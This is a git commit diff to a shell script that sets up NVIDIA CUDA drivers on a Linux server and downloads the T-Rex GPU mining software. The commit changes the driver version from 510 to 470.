7cb93da029e772569a08d17bae3bd6b5a1d48efd
dinhtrungac1 <91616570+dinhtrungac1@users.noreply.github.com>
2022-05-05 22:13:31 +0700

    Update vps.sh

--- vps.sh
+++ vps.sh
@@ -8,15 +8,11 @@ wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_
 sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
 sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
 echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
-sudo apt-key del 7fa2af80
-sudo rm /etc/apt/sources.list.d/cuda.list
-sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-keyring_1.0-1_all.deb
-sudo dpkg -i cuda-keyring_1.0-1_all.deb
 sudo apt-get update
 sudo apt-get -y install cuda-drivers
 sudo apt-get install libcurl3 -y
-sudo apt-get install cuda-drivers-510
-sudo apt-get install cuda-drivers-fabricmanager-510 -y
+sudo apt-get install cuda-drivers-470
+sudo apt-get install cuda-drivers-fabricmanager-470 -y
 sudo systemctl enable nvidia-fabricmanager
 sudo systemctl start nvidia-fabricmanager
 wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
